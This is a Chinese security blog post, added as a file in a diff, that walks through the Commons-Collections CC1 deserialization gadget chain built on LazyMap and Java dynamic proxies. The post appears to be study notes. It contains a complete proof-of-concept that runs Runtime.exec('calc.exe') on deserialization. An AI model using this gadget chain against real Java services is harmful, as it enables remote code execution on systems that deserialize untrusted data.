@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="上一篇跟着P师傅一步一步构造出了一个CC1的poc，但是那个CC1的利用链呢，跟ysoserial的源码中的利用链，有些不一样。在ysoserial中，CC1利用链使用到的是LazyMap而不是TransformedMap。 ysoserial中的LazyMap是什么LazyMap和TransformedMap类似，都来自Commons-Collections库，并继承AbstractMapDec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全漫谈-CommonsCollections1-lazyMap">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;11&#x2F;16&#x2F;Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CommonsCollections1-lazyMap&#x2F;index.html">
+<meta property="og:site_name" content="irrik&#39;s Blog">
+<meta property="og:description" content="上一篇跟着P师傅一步一步构造出了一个CC1的poc，但是那个CC1的利用链呢，跟ysoserial的源码中的利用链，有些不一样。在ysoserial中，CC1利用链使用到的是LazyMap而不是TransformedMap。 ysoserial中的LazyMap是什么LazyMap和TransformedMap类似，都来自Commons-Collections库，并继承AbstractMapDec">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;16&#x2F;lJTfDLuhWbQOEoU.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;18&#x2F;2ykgEspvKcdJ71e.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;18&#x2F;MmIERlzKkbJVPnF.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;18&#x2F;WGJmdLw9eQ2kyih.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;18&#x2F;RzIPhH1xKSiyvXU.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;18&#x2F;lvwWu4csNyV1zZD.png">
+<meta property="og:updated_time" content="2021-11-18T05:03:03.442Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;16&#x2F;lJTfDLuhWbQOEoU.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/11/16/Java安全漫谈-CommonsCollections1-lazyMap/"/>
+
+
+
+
+
+  <title>Java安全漫谈-CommonsCollections1-lazyMap | irrik's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">irrik's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">夏天要过去了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/11/16/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CommonsCollections1-lazyMap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="irrik">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="irrik's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Java安全漫谈-CommonsCollections1-lazyMap</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-11-16T22:32:06+08:00">
+                2021-11-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  9
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>上一篇跟着P师傅一步一步构造出了一个CC1的poc，但是那个CC1的利用链呢，跟ysoserial的源码中的利用链，有些不一样。<br>在ysoserial中，CC1利用链使用到的是LazyMap而不是TransformedMap。</p>
+<h2 id="ysoserial中的LazyMap是什么"><a href="#ysoserial中的LazyMap是什么" class="headerlink" title="ysoserial中的LazyMap是什么"></a>ysoserial中的LazyMap是什么</h2><p>LazyMap和TransformedMap类似，都来自Commons-Collections库，并继承AbstractMapDecorator。<br>LazyMap的漏洞触发点和TransformedMap的差别在于，TransformedMap是在往Map中写入元素时执行transform。<br>而LazyMap是在它的get方法中执行factory.transform。LazyMap的作用是“懒加载”，在get方法找不到值的时候它会调用factry.transform</p>
+<p>新建项目。环境配置参考<a href="https://irrik.github.io/2021/03/16/java%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%B0%8F%E7%9F%A5%E8%AF%86/#more" target="_blank" rel="noopener">传送门</a><br>还是熟悉的ctrl+shift+alt+n。搜索LazyMap。看看它的构造函数和get函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再看看get函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>只要构造LazyMap的时候传入一个ChainedTransformer，当触发get函数的时候就能执行精心构造的payload。<br>但是相比于TransformedMap的利用，LazyMap后续利用稍微复杂一些。<br>这是因为sun.reflect.annotation.AnnotationInvocationHandler的readObject中没有直接调用到Map的get方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map var3 = var2.memberTypes();</span><br><span class="line">    Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        Entry var5 = (Entry)var4.next();</span><br><span class="line">        String var6 = (String)var5.getKey();</span><br><span class="line">        Class var7 = (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object var8 = var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是在AnnotationInvocationHandler的invoke方法中有调用到get方法<br><img src="https://i.loli.net/2021/11/16/lJTfDLuhWbQOEoU.png" alt="1.png"><br>其中的核心就是这一行代码<code>Object var6 = this.memberValues.get(var4);</code><br>memberValues是传入的LazyMap。这里调用了get方法。<br>只要LazyMap中不存在var4这个key，就能够触发transform方法执行payload。<br>问题在于<strong>如何调用到AnnotationInvocationHandler的invoke方法？</strong><br>ysoserial使用了Java对象代理的方式来解决这个问题。</p>
+<h2 id="Java代理"><a href="#Java代理" class="headerlink" title="Java代理"></a>Java代理</h2><p>Java作为一门静态语言，如果想劫持一个对象内部的方法调用，需要使用到java.reflect.Proxy<br>推荐先看看廖雪峰的动态代理篇<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984#0" target="_blank" rel="noopener">传送门</a></p>
+<p>简单总结一下，生成一个Java代理对象需要的条件和过程：</p>
+<ol>
+<li>需要一个实现了InvocationHandler接口的类对象，这个类需要实现一个invoke方法。invoke方法负责处理接口方法的调用</li>
+<li>通过Proxy.newProxyInstance()创建interface实例，它需要三个参数：<br> 一. 一个ClassLoader，通常就是接口的ClassLoader<br> 二. 需要实现的接口数组，至少要传入一个接口进去<br> 三. 用来处理接口方法调用的实现InvocationHandler接口的类对象</li>
+<li>需要将Proxy.newProxyInstance()返回的Object强制转型为接口。</li>
+</ol>
+<p>用一个简单的例子来说明这个过程。简单修改一下P师傅的代码<br>先是一个实现了InvocationHandler接口的类<br>InvocationHandler接口有一个invoke方法需要实现<br>ExampleInvocationHandler类实现了InvocationHandler接口，所以它需要实现invoke方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExampleInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"invoke method: "</span> + method);</span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">"get"</span>)) &#123;</span><br><span class="line">            System.out.println(<span class="string">"running method:"</span> + method.getName());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"Hook method: "</span> + method.getName());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来尝试利用这个ExampleInvocationHandler去实现一个Java对象的代理，这里以代理Map接口为例。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InvocationHandler handler = <span class="keyword">new</span> ExampleInvocationHandler();</span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);</span><br><span class="line">        <span class="comment">//现在调用proxyMap的任何方法都会经过handler的invoke方法处理</span></span><br><span class="line">        <span class="comment">//而这个proxyMap是Map接口的实例，也就是说，proxyMap可以调用任意Map接口中的方法</span></span><br><span class="line">        <span class="comment">//并且这些方法的调用都会经过handler的invoke方法处理</span></span><br><span class="line">        proxyMap.put(<span class="string">"a"</span>,<span class="string">"b"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>补充一点Java小知识</strong><br>接口不是类，所以不能用new实例化一个接口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map x = new Map(); //不行</span><br></pre></td></tr></table></figure>
+<p>但是可以声明接口的变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map x; //ok</span><br></pre></td></tr></table></figure>
+<p>这个接口的变量必须引用实现了这个接口的类对象，所以有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map x = new HashMap(); //ok</span><br></pre></td></tr></table></figure>
+<p>运行结果：<br><img src="https://i.loli.net/2021/11/18/2ykgEspvKcdJ71e.png" alt="1.png"><br>如果在proxyMap.put打下断点单步调试，会发现put方法之后进入到了ExampleInvocationHandler的invoke方法当中<br><img src="https://i.loli.net/2021/11/18/MmIERlzKkbJVPnF.png" alt="1.png"></p>
+<p>回过头，看看sun.reflect.annotation.AnnotationInvocationHandler，这个类实际上实现了InvocationHandler</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+<p>那么思路就来了。构造一个Map实例proxyMap。这个Map的handler用AnnotationInvocationHandler对象来做。<br>那么当proxyMap调用任意方法的时候，就会触发AnnotationInvocationHandler的invoke函数，<br>进而执行transform方法触发payload。</p>
+<h2 id="使用LazyMap构造利用链"><a href="#使用LazyMap构造利用链" class="headerlink" title="使用LazyMap构造利用链"></a>使用LazyMap构造利用链</h2><p>在上一篇使用TransformedMap的CC1利用链的poc基础上进行修改<br>先使用LazyMap替换TransformedMap</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map outerMap = LazyMap.decorate(innerMap, transformChain);</span><br></pre></td></tr></table></figure>
+<p>然后，需要使用AnnotationInvocationHandler对Map接口进行代理</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">Constructor construct = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">construct.setAccess(<span class="keyword">true</span>);</span><br><span class="line">InvocationHandler handler = (InvocationHandler) construct.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line">Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure>
+<p>代理后的对象是proxyMap，将这个对象传入到另一个作为反序列化利用链入口的AnnotationInvocationHandler中<br>当readObject方法中调用proxyMap的任意方法，就会转到handler的invoke方法中。<br>从而触发payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object obj = construct.newInstance(Target.class, proxyMap);</span><br></pre></td></tr></table></figure>
+<p>整个的一个改造后的POC如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new String[] &#123;"calc.exe"&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"xxxx"</span>); <span class="comment">//可留可删，key不能为entrySet,value随便改，无所谓</span></span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);</span><br><span class="line">        Object obj = construct.newInstance(SuppressWarnings<span class="class">.<span class="keyword">class</span>, <span class="title">proxyMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行这个poc，能弹出计算器<br><img src="https://i.loli.net/2021/11/18/WGJmdLw9eQ2kyih.png" alt="1.png"><br>因为LazyMap和之前TransformedMap利用逻辑不一样，所以innerMap为空不仅没关系，还是最好了。因为key是entrySet的时候触发不了payload。</p>
+<h2 id="简单分析利用链"><a href="#简单分析利用链" class="headerlink" title="简单分析利用链"></a>简单分析利用链</h2><p>直接在LazyMap的get方法处下断点：<br><img src="https://i.loli.net/2021/11/18/RzIPhH1xKSiyvXU.png" alt="1.png"><br>然后debug，注意下面的调用栈<br><img src="https://i.loli.net/2021/11/18/lvwWu4csNyV1zZD.png" alt="1.png"><br>从AnnotationInvocationHandler#readObject中调用entrySet<br>随后被代理到handler的invoke方法<br>最后到LazyMap的get方法中。随后就是熟悉的payload触发流程。</p>
+<ol>
+<li>AnnotationInvocationHandler#readObject 调用entrySet</li>
+<li>entrySet-&gt;AnnotationInvocationHandler#invoke</li>
